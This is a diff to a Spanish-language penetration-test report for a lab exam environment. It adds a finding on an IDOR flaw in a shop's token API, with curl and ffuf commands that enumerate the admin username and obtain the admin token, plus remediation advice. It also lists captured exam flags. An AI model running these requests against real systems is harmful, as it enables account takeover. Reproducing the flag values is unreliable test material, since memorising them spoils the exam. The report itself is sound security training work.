@@ -1,6 +1,6 @@
 # Trilocor — Web Application Security Assessment
 
-**Cliente / Entorno:** Trilocor (laboratorio CWES) **IP:** `10.129.248.61` **Hosts (`/etc/hosts`):** `trilocor.local`, `www.trilocor.local`, `admin.trilocor.local` **Fecha:** Junio 2026 **Alcance:** Cinco aplicaciones web independientes (contenedores separados) sobre la misma IP.
+**Cliente / Entorno:** Trilocor (laboratorio CWES) **IP:** `10.129.248.61` **Hosts (`/etc/hosts`):** `trilocor.local`, `www.trilocor.local`, `admin.trilocor.local` **Fecha:** Junio 2026 **Alcance:** Seis aplicaciones web independientes (contenedores separados) sobre la misma IP, incluyendo la tienda Trilocor Shop (`:9000`).
 
 > Nota de direccionamiento: la IP de la máquina objetivo cambió entre sesiones del laboratorio (reasignación de DHCP), pero corresponde a un único host. Todas las referencias se normalizan a la IP vigente: `10.129.248.61`.
 
@@ -8,10 +8,11 @@
 
 ## 1. Resumen ejecutivo
 
-Se evaluaron cinco aplicaciones web del entorno Trilocor. Se identificaron **siete hallazgos**, de los cuales **cinco son de severidad crítica** (cuatro derivan en ejecución remota de código). Las aplicaciones comparten un conjunto de debilidades recurrentes:
+Se evaluaron seis aplicaciones web del entorno Trilocor. Se identificaron **ocho hallazgos**, de los cuales **cinco son de severidad crítica** (cuatro derivan en ejecución remota de código). Las aplicaciones comparten un conjunto de debilidades recurrentes:
 
 - **Validación de entrada dependiente del método HTTP.** En la app HR (8088), los filtros de seguridad se aplican solo a una rama (GET o POST) dejando la otra expuesta — patrón que habilitó tanto el bypass de autenticación como el LFI→RCE.
 - **Inyección SQL por concatenación directa** en dos aplicaciones distintas (HR 8088 y Jobs 8080), una de ellas escalada a RCE mediante `INTO OUTFILE`.
+- **Control de acceso roto a nivel de objeto (IDOR/BOLA).** En la app Shop (9000), el endpoint de emisión de tokens confía en el `uid`/`username` del cuerpo de la petición en lugar de la sesión, permitiendo suplantar al `administrator`.
 - **Gestión de credenciales y sesiones deficiente:** tokens de reset triviales (4 dígitos sin throttling), contraseñas débiles derivadas del username, reutilización de credenciales entre servicios, y cookies de sesión sin `HttpOnly`.
 - **Componentes desactualizados:** WordPress con un plugin a medida vulnerable a Stored XSS y Elementor 3.7.7 afectado por CVE-2023-48777 (RCE).
 
@@ -32,22 +33,25 @@ El impacto agregado es el **compromiso total** de múltiples aplicaciones: ejecu
 |5|Account Takeover vía brute force de reset token|Jobs Portal — `8080`|Alta|Cuenta `r.batty`|
 |6|SQL Injection (UNION) → RCE vía `INTO OUTFILE`|Jobs Portal — `8080`|Crítica|RCE `apache`|
 |7|Enumeración WP + credencial débil (XML-RPC) → panel admin|PR Admin — `8009`|Alta|Acceso panel `/admin`|
+|9|Broken Object Level Authorization (IDOR) en `/api/tokens` → acceso admin|Trilocor Shop — `9000`|Alta|Token + flag de `administrator`|
 
 ---
 
 ## 2.1 — Flags obtenidas (por tarea del examen)
 
-> El examen consta de 8 tareas; algunas comparten cadena de explotación (p. ej. el acceso de la tarea 1 y el RCE de la tarea 2 parten ambos del WordPress). La tarea 8 (PR admin) se encuentra en progreso al momento de este documento.
+> El examen consta de varias tareas; algunas comparten cadena de explotación (p. ej. el acceso de la tarea 1 y el RCE de la tarea 2 parten ambos del WordPress). La **tarea 8** (XXE / PR admin) se omitió en esta corrida y queda pendiente; la **tarea 9** (Trilocor Shop) se resolvió y se documenta en el Hallazgo 9.
 
-|Tarea|Objetivo|Hallazgo|Flag|
-|---|---|---|---|
-|1|Acceso al admin dashboard de la web principal|1|`b2641186f0add94dc7d7845d82550047`|
-|2|RCE en la web principal → `.txt` en `/`|2|`ff01bfb24eb5f1746c6bdfba5b7efee3`|
-|3|Bypass del login del HR dashboard|3|`f94f3cd14bc0b690fe3a437f7becbcd2`|
-|4|RCE en el HR dashboard → `.txt` en `/`|4|`4527e8cbacb4a6f4023154dfa604bccf`|
-|5|Acceso al panel admin del Jobs Portal|5|`de0344e95fc7c8346fea9e617438bb73`|
-|6|RCE en el Jobs Portal → `.txt` en `/`|6|`3d9358f76943c092465963bad922f822`|
-|7|Acceso al panel PR admin|7|`8711ea1e4574e9c78f28b696da3e0a39`|
+| Tarea | Objetivo                                      | Hallazgo | Flag                               |
+| ----- | --------------------------------------------- | -------- | ---------------------------------- |
+| 1     | Acceso al admin dashboard de la web principal | 1        | `b2641186f0add94dc7d7845d82550047` |
+| 2     | RCE en la web principal → `.txt` en `/`       | 2        | `ff01bfb24eb5f1746c6bdfba5b7efee3` |
+| 3     | Bypass del login del HR dashboard             | 3        | `f94f3cd14bc0b690fe3a437f7becbcd2` |
+| 4     | RCE en el HR dashboard → `.txt` en `/`        | 4        | `4527e8cbacb4a6f4023154dfa604bccf` |
+| 5     | Acceso al panel admin del Jobs Portal         | 5        | `de0344e95fc7c8346fea9e617438bb73` |
+| 6     | RCE en el Jobs Portal → `.txt` en `/`         | 6        | `3d9358f76943c092465963bad922f822` |
+| 7     | Acceso al panel PR admin                      | 7        | `8711ea1e4574e9c78f28b696da3e0a39` |
+| 8     | PR admin                                      | —        | _(pendiente / omitida)_            |
+| 9     | Acceso admin en Trilocor Shop → leer la flag  | 9        | `42972588ec91464a86d31090a4fb994c` |
 
 ---
 
@@ -488,13 +492,88 @@ Deshabilitar/limitar XML-RPC con rate limiting; política de contraseñas fuerte
 
 ---
 
+## Hallazgo 9 — Broken Object Level Authorization (IDOR) en emisión de tokens → Acceso admin (Trilocor Shop)
+
+**Host:** `trilocor.local:9000` (Trilocor Shop) — **Endpoint:** `/api/tokens` (POST, JSON) **Parámetro:** `uid` (+ `username`) en el cuerpo de la petición **Tipo:** Broken Object Level Authorization / IDOR — **CWE-639** (Authorization Bypass Through User-Controlled Key), **OWASP API1:2023** **Severidad:** Alta — **Resultado:** token y flag de `administrator` **Precondición:** una cuenta cualquiera registrada (sesión autenticada propia). **Tarea del examen:** flag 9 — _"Try to gain admin access on Trilocor's Shop to read the flag."_
+
+### Resumen
+
+El endpoint `/api/tokens` emite un token (y devuelve la flag asociada) para el usuario **identificado por el `uid` y `username` que vienen en el cuerpo de la petición**, en lugar de derivar la identidad de la sesión autenticada en el servidor. La sesión sirve solo para superar el muro de "estar logueado"; la decisión de _a qué usuario pertenece el token_ se toma con datos controlados por el cliente.
+
+El `uid` es una **referencia directa a objeto** sin control de autorización a nivel de objeto: cambiándolo por el de otra cuenta se obtiene el token de esa cuenta. El servidor sí valida que el par `(uid, username)` corresponda a un usuario real —por eso una `uid` válida con un `username` incorrecto falla—, pero **no** valida que ese par coincida con el usuario de la sesión. Esa validación parcial es la que convierte el ataque en dos pasos: fijar `uid=1` (admin) y **enumerar el `username`** hasta encontrar el que casa con esa `uid`.
+
+### Por qué funciona (raíz)
+
+La autorización a nivel de objeto se delega en un identificador que el atacante controla. El patrón es el mismo antipatrón sistémico del resto del entorno: **confiar en la entrada del cliente para una decisión de seguridad** (acá, la identidad del dueño del recurso). El control correcto —"¿el usuario de _esta sesión_ puede pedir el token de _este `uid`_?"— no existe. Como `uid` es secuencial (el usuario propio es el `3`, el admin es el `1`), el espacio a probar es trivial.
+
+### Oráculo de respuesta
+
+|Cuerpo enviado|Significado|
+|---|---|
+|`{"uid":"3","username":"test"}`|Par propio válido → token propio (línea base)|
+|`{"uid":"1","username":"test"}`|`uid` admin pero `username` no casa → error / _invalid_|
+|`{"uid":"1","username":"administrator"}`|Par válido del admin → token + flag de `administrator`|
+
+### Reproducción
+
+```bash
+T="http://trilocor.local:9000"         # Trilocor Shop
+SID="<PHPSESSID de la sesión propia>"  # cuenta registrada (uid=3, username=test)
+
+# 1) Línea base: observar la petición legítima (vista en Burp)
+#    El servidor confía en el uid/username del body, no en la sesión.
+curl -s -X POST "$T/api/tokens" \
+  -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
+  -d '{"uid":"3","username":"test"}'
+# -> token propio (uid=3)
+
+# 2) Confirmar el IDOR: cambiar uid sin tocar la sesión
+curl -s -X POST "$T/api/tokens" \
+  -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
+  -d '{"uid":"1","username":"test"}'
+# -> error: el par (uid=1, username=test) no existe
+#    => el username de uid=1 hay que descubrirlo
+
+# 3) Enumerar el username de uid=1
+ffuf -w /usr/share/seclists/Usernames/Names/admin-users.txt \
+  -u "$T/api/tokens" -X POST \
+  -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
+  -d '{"uid":"1","username":"FUZZ"}' \
+  -mc 200 -fr 'error|invalid|not found' -t 3 -rate 8
+# -> administrator
+
+# 4) Recuperar token + flag del admin
+curl -s -X POST "$T/api/tokens" \
+  -H 'Content-Type: application/json' -H "Cookie: PHPSESSID=$SID" \
+  -d '{"uid":"1","username":"administrator"}'
+# -> {"token":"<token de administrator>","flag":"<flag>"}
+```
+
+### Nota metodológica — Burp
+
+La petición a `/api/tokens` no aparece navegando la UI; se descubre interceptando el tráfico (POST con cuerpo JSON `{"uid":"3","username":"test"}`). Flujo recomendado: mandar la request a **Repeater**, cambiar `uid` a `1` para confirmar el IDOR, y luego pasarla a **Intruder** marcando `username` como única posición de payload (lista de usernames de admin: `administrator`, `admin`, `root`, `superadmin`, …) hasta que la respuesta cambie de _error_ a token+flag. Verificar que `Content-Type: application/json` se mantenga al enviar desde Intruder.
+
+### Impacto
+
+Suplantación de cualquier usuario por su `uid`, incluido `administrator`: emisión de su token de sesión/API y lectura de datos restringidos (la flag). Con la `uid` secuencial y sin rate limiting, el acceso administrativo es directo desde cualquier cuenta recién creada, sin credenciales del admin.
+
+### Remediación
+
+- Derivar **siempre** la identidad (`uid`/`username`) de la sesión autenticada en el servidor; **nunca** aceptarla del cuerpo de la petición para decisiones de autorización.
+- Aplicar control de autorización **a nivel de objeto**: antes de emitir el token, verificar que el `uid` solicitado pertenece al usuario de la sesión (o que la sesión tiene un rol que lo autoriza explícitamente).
+- Evitar identificadores secuenciales/enumerables como única referencia de objeto (usar valores no adivinables: UUID), sin que ello sustituya el chequeo de autorización.
+- Acotar y monitorear `/api/tokens` con rate limiting para frenar la enumeración; respuestas de error genéricas que no diferencien "uid inexistente" de "username no casa".
+
+---
+
 ## 5. Conclusiones
 
-El entorno Trilocor presenta debilidades sistémicas más allá de los fallos individuales:
+El entorno Trilocor presenta debilidades sistémicas más allá de los fallos individuales. El hilo común es **confiar en la entrada del cliente para una decisión de seguridad**, ya sea el método HTTP, los caracteres de una consulta o la identidad del dueño de un recurso:
 
 1. **Validación dependiente del método HTTP** (Hallazgos 3 y 4) — un antipatrón que debe corregirse centralizando la validación server-side.
 2. **Inyección SQL por concatenación** en dos aplicaciones (Hallazgos 3 y 6) — resoluble de raíz con prepared statements.
-3. **Gestión de credenciales y sesiones** (Hallazgos 1, 5, 7) — cookies sin `HttpOnly`, tokens débiles, contraseñas adivinables y reutilización entre servicios.
-4. **Componentes desactualizados** (Hallazgos 1 y 2) — el parcheo de Elementor y la revisión del plugin a medida eliminan dos vías a RCE.
+3. **Control de acceso a nivel de objeto (IDOR/BOLA)** (Hallazgo 9) — la autorización delegada en un identificador (`uid`) controlado por el cliente; misma raíz que los Hallazgos 3 y 4, corregible derivando la identidad de la sesión y validando autorización por objeto.
+4. **Gestión de credenciales y sesiones** (Hallazgos 1, 5, 7) — cookies sin `HttpOnly`, tokens débiles, contraseñas adivinables y reutilización entre servicios.
+5. **Componentes desactualizados** (Hallazgos 1 y 2) — el parcheo de Elementor y la revisión del plugin a medida eliminan dos vías a RCE.
 
-Prioridad de remediación: los cuatro caminos a RCE (Hallazgos 2, 4, 6 y el potencial del 3) primero, por su impacto de compromiso total; luego el endurecimiento de credenciales/sesiones y la actualización de componentes.
+Prioridad de remediación: los cuatro caminos a RCE (Hallazgos 2, 4, 6 y el potencial del 3) primero, por su impacto de compromiso total; luego el control de acceso a nivel de objeto (Hallazgo 9), el endurecimiento de credenciales/sesiones y la actualización de componentes.
